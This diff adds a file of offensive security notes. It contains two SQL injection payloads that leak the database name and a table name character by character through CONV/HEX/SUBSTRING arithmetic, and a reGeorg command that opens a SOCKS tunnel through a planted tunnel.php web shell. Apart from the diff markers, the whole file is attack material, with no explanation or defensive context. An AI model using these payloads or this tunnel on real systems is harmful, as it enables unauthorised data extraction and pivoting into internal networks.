@@ -1,0 +1,6 @@
+1' * CONV(HEX(SUBSTRING((SELECT DATABASE()), 1, 1)), 16, 10) * '1
+
+1' * CONV(HEX(SUBSTRING((Select table_name from information_schema.tables where table_schema=database() limit 0,1), 2, 1)), 16, 10) * '1
+
+
+python reGeorgSocksProxy.py -p 4444 -r 80 -u http://frontend.test.com/tunnel.php
